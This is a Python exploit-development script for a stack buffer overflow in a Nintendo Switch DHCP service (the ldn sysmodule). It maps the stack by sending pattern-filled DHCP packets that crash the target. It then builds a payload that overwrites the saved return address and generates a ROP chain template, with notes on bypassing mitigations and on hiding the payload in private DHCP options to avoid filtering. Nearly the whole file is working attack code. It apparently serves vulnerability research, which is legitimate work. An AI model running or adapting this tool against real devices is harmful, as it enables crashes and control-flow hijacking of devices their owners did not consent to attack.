#!/usr/bin/env python3
"""
CVE-2026-82079 — Stack Layout Mapper & Exploit Payload Builder

After lp2p_dhcp_overflow.py finds the crash boundary, this tool:
1. Sends De Bruijn patterns to find the exact return address (x30) offset
2. Maps the stack layout by observing crash behavior at different offsets
3. Generates exploit payloads with controlled return addresses

AArch64 Erista (S1) specific:
- NO stack canaries (not documented)
- NO PAC (S2 only)
- NX stack = need ROP, can't exec shellcode on stack
- ASLR = 17 bits entropy (2MB-aligned), need infoleak

Usage:
    # Phase 1: Find x30 offset using timing/crash analysis
    sudo python3 -I dhcp_stack_mapper.py --iface wlp5s0 --boundary 512 --map

    # Phase 2: Generate exploit payload (after finding offset + base address)
    python3 -I dhcp_stack_mapper.py --generate --boundary 512 --x30-offset 528 --base 0x7100000000

Evidence saved to ../evidence/lp2p_dhcp/
"""

import struct
import argparse
import json
import sys
import time
import random
import socket
from pathlib import Path
from datetime import datetime, timezone

EVIDENCE_DIR = Path(__file__).parent.parent / "evidence" / "lp2p_dhcp"
DHCP_SERVER_PORT = 67
DHCP_CLIENT_PORT = 68


def evidence_dir():
    EVIDENCE_DIR.mkdir(parents=True, exist_ok=True)
    return EVIDENCE_DIR


def de_bruijn(n: int, k: int = 256) -> bytes:
    """Generate a De Bruijn sequence of order n over k symbols.

    For AArch64 with 8-byte pointers, n=8 gives unique 8-byte subsequences.
    Each 8-byte window in the output is unique, so the offset of any
    8-byte value found in a register reveals its position in the buffer.
    """
    if k == 256 and n == 8:
        return _de_bruijn_cyclic(n, k)
    return _de_bruijn_cyclic(n, k)


def _de_bruijn_cyclic(n: int, k: int) -> bytes:
    """Generate De Bruijn sequence B(k,n) using Martin's algorithm."""
    a = [0] * (k * n)
    sequence = []

    def db(t, p):
        if t > n:
            if n % p == 0:
                sequence.extend(a[1:p + 1])
        else:
            a[t] = a[t - p]
            db(t + 1, p)
            for j in range(a[t - p] + 1, k):
                a[t] = j
                db(t + 1, t)

    db(1, 1)
    return bytes(sequence[:k**n])


def de_bruijn_pattern(size: int) -> bytes:
    """Generate a unique byte pattern of exactly `size` bytes.

    Uses a simplified approach: 4-byte De Bruijn over printable ASCII,
    repeated as 8-byte aligned chunks with a high-nibble tag.
    Each 8-byte aligned position is unique up to 65536 positions.
    """
    pattern = bytearray(size)
    for i in range(0, size, 8):
        idx = i // 8
        hi = (idx >> 8) & 0xFF
        lo = idx & 0xFF
        chunk = bytes([
            0x41 + (hi >> 4),
            0x41 + (hi & 0xF),
            0x41 + (lo >> 4),
            0x41 + (lo & 0xF),
            0x61 + (hi >> 4),
            0x61 + (hi & 0xF),
            0x61 + (lo >> 4),
            0x61 + (lo & 0xF),
        ])
        end = min(i + 8, size)
        pattern[i:end] = chunk[:end - i]
    return bytes(pattern)


def find_pattern_offset(pattern: bytes, value: int) -> int | None:
    """Find the offset of an 8-byte value in the De Bruijn pattern.

    Given a register value from a crash dump, find where it appears
    in the pattern to determine the buffer→register offset.
    """
    needle = struct.pack("<Q", value)
    idx = pattern.find(needle)
    if idx >= 0:
        return idx
    idx = pattern.find(struct.pack(">Q", value))
    if idx >= 0:
        return idx
    return None


def build_dhcp_packet(mac: bytes, msg_type: int = 1,
                      extra_options: bytes = b"",
                      xid: int | None = None) -> tuple[bytes, int]:
    if xid is None:
        xid = random.randint(0, 0xFFFFFFFF)
    pkt = struct.pack("!BBBB", 1, 1, 6, 0)
    pkt += struct.pack("!I", xid)
    pkt += struct.pack("!HH", 0, 0x8000)
    pkt += b"\x00" * 16
    pkt += mac + b"\x00" * 10
    pkt += b"\x00" * 64
    pkt += b"\x00" * 128
    pkt += b"\x63\x82\x53\x63"
    pkt += bytes([53, 1, msg_type])
    pkt += bytes([61, 7, 1]) + mac
    pkt += bytes([55, 4, 1, 3, 6, 28])
    pkt += extra_options
    pkt += bytes([255])
    return pkt, xid


def pack_options_with_payload(payload: bytes) -> bytes:
    """Pack a raw payload into DHCP options (max 255 bytes per option).

    Distributes the payload across multiple DHCP options using
    private-range codes (224-254) to minimize server-side filtering.
    """
    options = b""
    offset = 0
    opt_code = 224

    while offset < len(payload) and opt_code < 255:
        chunk_size = min(255, len(payload) - offset)
        options += bytes([opt_code, chunk_size])
        options += payload[offset:offset + chunk_size]
        offset += chunk_size
        opt_code += 1

    if offset < len(payload):
        remaining = len(payload) - offset
        for code in [43, 60, 77, 12]:
            if remaining <= 0:
                break
            chunk_size = min(255, remaining)
            options += bytes([code, chunk_size])
            options += payload[offset:offset + chunk_size]
            offset += chunk_size
            remaining -= chunk_size

    return options


def random_mac() -> bytes:
    mac = bytearray(6)
    mac[0] = 0x02
    for i in range(1, 6):
        mac[i] = random.randint(0, 255)
    return bytes(mac)


def send_dhcp(iface: str, pkt: bytes, timeout: float = 3) -> tuple[bytes | None, float]:
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    try:
        sock.setsockopt(socket.SOL_SOCKET, 25, iface.encode())
    except PermissionError:
        print("  Need sudo for SO_BINDTODEVICE")
        sock.close()
        return None, 0
    sock.settimeout(timeout)
    t0 = time.monotonic()
    try:
        sock.bind(("0.0.0.0", DHCP_CLIENT_PORT))
        sock.sendto(pkt, ("255.255.255.255", DHCP_SERVER_PORT))
        try:
            data, addr = sock.recvfrom(4096)
            return data, time.monotonic() - t0
        except socket.timeout:
            return None, time.monotonic() - t0
    finally:
        sock.close()


def check_server_alive(iface: str) -> bool:
    mac = random_mac()
    pkt, _ = build_dhcp_packet(mac, msg_type=1)
    resp, _ = send_dhcp(iface, pkt, timeout=3)
    return resp is not None


def map_stack_layout(iface: str, boundary: int):
    """Send pattern-filled payloads around the crash boundary.

    Sends packets at boundary-16 through boundary+256 in 8-byte steps.
    For each, records whether the server crashes. The pattern of crashes
    reveals the stack layout: x29 and x30 are typically at boundary+0
    and boundary+8 respectively.
    """
    print(f"\n{'=' * 60}")
    print(f"Stack Layout Mapping (boundary = {boundary} bytes)")
    print("=" * 60)
    print("Sending pattern-filled payloads at 8-byte increments")
    print("around the crash boundary to map saved registers.\n")

    results = []
    base_pattern = de_bruijn_pattern(boundary + 512)

    for offset in range(-16, 264, 8):
        payload_size = boundary + offset
        if payload_size < 64:
            continue

        if not check_server_alive(iface):
            print("  Waiting for server recovery...")
            for _ in range(30):
                time.sleep(1)
                if check_server_alive(iface):
                    break
            else:
                print("  Server not recovering. Record results so far.")
                break
            time.sleep(1)

        payload = base_pattern[:payload_size]
        options = pack_options_with_payload(payload)
        mac = random_mac()
        pkt, xid = build_dhcp_packet(mac, extra_options=options)
        resp, elapsed = send_dhcp(iface, pkt)

        entry = {
            "payload_size": payload_size,
            "offset_from_boundary": offset,
            "response": resp is not None,
            "elapsed": round(elapsed, 4),
        }

        if resp:
            print(f"  ✓ boundary{offset:+4d} = {payload_size:5d}B → OK ({elapsed:.3f}s)")
        else:
            time.sleep(1)
            alive = check_server_alive(iface)
            entry["server_alive"] = alive
            if not alive:
                entry["crash"] = True
                print(f"  ✗ boundary{offset:+4d} = {payload_size:5d}B → CRASH!")
                time.sleep(5)
            else:
                print(f"  ~ boundary{offset:+4d} = {payload_size:5d}B → rejected")

        results.append(entry)
        time.sleep(0.3)

    crash_offsets = [r["offset_from_boundary"] for r in results if r.get("crash")]
    if crash_offsets:
        first_crash = min(crash_offsets)
        print(f"\n  ═══ First crash at boundary{first_crash:+d} ═══")
        print(f"  Likely x29 at offset {boundary + first_crash}")
        print(f"  Likely x30 at offset {boundary + first_crash + 8}")
    else:
        print("\n  No crashes detected in this range.")
        print("  Boundary may need adjustment, or server recovers too fast.")

    summary = {
        "test": "stack_layout_mapping",
        "timestamp": datetime.now(timezone.utc).isoformat(),
        "boundary": boundary,
        "results": results,
        "crash_offsets": crash_offsets,
    }

    path = evidence_dir() / "stack_layout.json"
    with open(path, "w") as f:
        json.dump(summary, f, indent=2, default=str)
    print(f"\nSaved: {path}")
    return summary


def generate_exploit_payload(boundary: int, x30_offset: int,
                             target_addr: int, base_addr: int = 0):
    """Generate a DHCP option payload that overwrites x30 with target_addr.

    Args:
        boundary: stack buffer size (from crash testing)
        x30_offset: offset from buffer start to saved x30 (from mapping)
        target_addr: address to write into x30 (first ROP gadget)
        base_addr: code base address (from ASLR leak), 0 = raw address
    """
    print(f"\n{'=' * 60}")
    print("Exploit Payload Generator")
    print("=" * 60)
    print(f"  Buffer boundary:  {boundary} bytes")
    print(f"  x30 offset:       {x30_offset} bytes")
    print(f"  Target address:   0x{target_addr:016x}")
    if base_addr:
        print(f"  Code base:        0x{base_addr:016x}")
        print(f"  Relative offset:  0x{target_addr - base_addr:016x}")

    x29_offset = x30_offset - 8

    payload = bytearray(x30_offset + 8)

    # Fill buffer with identifiable pattern (NOP sled equivalent for debugging)
    for i in range(0, min(x29_offset, len(payload)), 8):
        struct.pack_into("<Q", payload, i, 0xDEADCAFE00000000 | i)

    # x29: point to a writable, valid-looking frame pointer
    # Use 0 or a known writable address. 0 may cause secondary crash on epilogue.
    struct.pack_into("<Q", payload, x29_offset, 0)

    # x30: the ROP chain entry point
    struct.pack_into("<Q", payload, x30_offset, target_addr)

    options = pack_options_with_payload(bytes(payload))
    mac = random_mac()
    pkt, xid = build_dhcp_packet(mac, extra_options=options)

    print(f"\n  Payload size:     {len(payload)} bytes")
    print(f"  DHCP options:     {len(options)} bytes")
    print(f"  Total packet:     {len(pkt)} bytes")
    print(f"  x29 at [{x29_offset}:{x29_offset + 8}] = 0x{0:016x}")
    print(f"  x30 at [{x30_offset}:{x30_offset + 8}] = 0x{target_addr:016x}")

    # Save payload
    path = evidence_dir() / "exploit_payload.bin"
    with open(path, "wb") as f:
        f.write(bytes(payload))

    # Save packet
    pkt_path = evidence_dir() / "exploit_packet.bin"
    with open(pkt_path, "wb") as f:
        f.write(pkt)

    # Save metadata
    meta = {
        "test": "exploit_payload",
        "timestamp": datetime.now(timezone.utc).isoformat(),
        "boundary": boundary,
        "x29_offset": x29_offset,
        "x30_offset": x30_offset,
        "target_addr": f"0x{target_addr:016x}",
        "base_addr": f"0x{base_addr:016x}" if base_addr else None,
        "payload_size": len(payload),
        "packet_size": len(pkt),
        "xid": f"0x{xid:08x}",
    }
    meta_path = evidence_dir() / "exploit_meta.json"
    with open(meta_path, "w") as f:
        json.dump(meta, f, indent=2)

    print(f"\n  Saved payload:  {path}")
    print(f"  Saved packet:   {pkt_path}")
    print(f"  Saved metadata: {meta_path}")

    return payload, pkt


def generate_rop_template(boundary: int, x30_offset: int, base_addr: int):
    """Generate a ROP chain template with placeholder gadgets.

    This creates the payload structure needed for the actual exploit.
    Gadget addresses must be filled in after obtaining the ldn sysmodule binary.
    """
    print(f"\n{'=' * 60}")
    print("ROP Chain Template Generator")
    print("=" * 60)

    x29_offset = x30_offset - 8

    # AArch64 ROP chain structure:
    # On function return: ldp x29, x30, [sp], #N; ret
    # x30 controls the next PC
    # x29 controls the frame pointer (for stack pivoting)
    #
    # Common gadgets needed:
    # 1. Stack pivot: set sp to a controlled value
    # 2. Register control: load x0-x7 from stack for function args
    # 3. Function call: blr xN with controlled xN
    # 4. SVC call: svc #0 for kernel syscall

    rop_chain = []

    # Placeholder gadget addresses (replace with real ones from binary)
    GADGETS = {
        "ldp_x29_x30_sp_ret": base_addr + 0x1234,  # placeholder
        "ldr_x0_sp_ret": base_addr + 0x5678,        # placeholder
        "ldr_x1_sp_ret": base_addr + 0xABCD,        # placeholder
        "blr_x0": base_addr + 0xEF01,               # placeholder
        "svc_0_ret": base_addr + 0x2345,             # placeholder
    }

    # Template ROP chain:
    # Step 1: Load arguments for svcSendSyncRequest or similar
    # Step 2: Call the target function
    # Step 3: Return to safe location or loop

    template = {
        "description": "ROP chain template for CVE-2026-82079",
        "target": "ldn sysmodule on Erista FW 22.5.0",
        "mitigations": {
            "aslr": "17 bits, 2MB-aligned — bypassed via AdvertiseData infoleak",
            "nx": "stack not executable — using ROP",
            "pac": "not present on Erista (S1)",
            "canary": "not documented — direct overwrite",
        },
        "layout": {
            "buffer_start": 0,
            "buffer_end": boundary,
            "x29": x29_offset,
            "x30": x30_offset,
        },
        "base_addr": f"0x{base_addr:016x}",
        "gadgets_needed": [
            "ldp x29, x30, [sp], #N; ret  — chain gadgets",
            "ldr x0, [sp, #offset]; ldp x29, x30, [sp], #N; ret  — load arg0",
            "ldr x1, [sp, #offset]; ldp x29, x30, [sp], #N; ret  — load arg1",
            "blr x0  — call function pointer",
            "svc #0; ret  — syscall",
        ],
        "chain_template": [
            {"step": 1, "action": "control x0 (first arg)", "gadget": "ldr_x0_sp_ret"},
            {"step": 2, "action": "control x1 (second arg)", "gadget": "ldr_x1_sp_ret"},
            {"step": 3, "action": "call target function", "gadget": "blr_x0"},
        ],
        "notes": [
            "Replace placeholder gadget addresses with real ones from ldn binary",
            "Use ROPgadget or ropper on the ldn NSO after extraction",
            "The ldn sysmodule loads: rtld, main, subsdk*, sdk (packed, no gaps)",
            "RELRO means GOT is read-only — use direct ROP, not GOT overwrite",
        ],
    }

    path = evidence_dir() / "rop_template.json"
    with open(path, "w") as f:
        json.dump(template, f, indent=2)
    print(f"  Saved ROP template: {path}")
    print(f"\n  Gadgets needed (replace with real addresses from binary):")
    for g in template["gadgets_needed"]:
        print(f"    - {g}")
    return template


def main():
    parser = argparse.ArgumentParser(
        description="CVE-2026-82079 Stack Layout Mapper & Exploit Builder")

    group = parser.add_mutually_exclusive_group(required=True)
    group.add_argument("--map", action="store_true",
                       help="Map stack layout around crash boundary (needs Switch)")
    group.add_argument("--generate", action="store_true",
                       help="Generate exploit payload (offline)")
    group.add_argument("--rop-template", action="store_true",
                       help="Generate ROP chain template (offline)")
    group.add_argument("--find-offset", metavar="VALUE",
                       help="Find De Bruijn pattern offset for a register value (hex)")

    parser.add_argument("--iface", help="WiFi interface (for --map)")
    parser.add_argument("--boundary", type=int,
                        help="Stack buffer boundary in bytes (from overflow probe)")
    parser.add_argument("--x30-offset", type=int,
                        help="Offset to saved x30 (from stack mapping)")
    parser.add_argument("--target", type=lambda x: int(x, 0), default=0x4141414141414141,
                        help="Target address for x30 (hex)")
    parser.add_argument("--base", type=lambda x: int(x, 0), default=0,
                        help="Code base address (from ASLR leak, hex)")

    args = parser.parse_args()

    if args.map:
        if not args.iface or not args.boundary:
            parser.error("--map requires --iface and --boundary")
        print("╔══════════════════════════════════════════════════════════╗")
        print("║  CVE-2026-82079 — Stack Layout Mapper                   ║")
        print("╚══════════════════════════════════════════════════════════╝")
        if not check_server_alive(args.iface):
            print("✗ DHCP server not responding.")
            sys.exit(1)
        print("✓ DHCP server alive")
        map_stack_layout(args.iface, args.boundary)

    elif args.generate:
        if not args.boundary or not args.x30_offset:
            parser.error("--generate requires --boundary and --x30-offset")
        generate_exploit_payload(args.boundary, args.x30_offset,
                                 args.target, args.base)

    elif args.rop_template:
        if not args.boundary or not args.x30_offset or not args.base:
            parser.error("--rop-template requires --boundary, --x30-offset, and --base")
        generate_rop_template(args.boundary, args.x30_offset, args.base)

    elif args.find_offset:
        value = int(args.find_offset, 16)
        size = max(8192, (args.boundary or 1024) + 512)
        pattern = de_bruijn_pattern(size)
        offset = find_pattern_offset(pattern, value)
        if offset is not None:
            print(f"Value 0x{value:016x} found at pattern offset {offset}")
            if args.boundary:
                print(f"  = boundary + {offset - args.boundary}")
        else:
            print(f"Value 0x{value:016x} not found in pattern (size {size})")


if __name__ == "__main__":
    main()
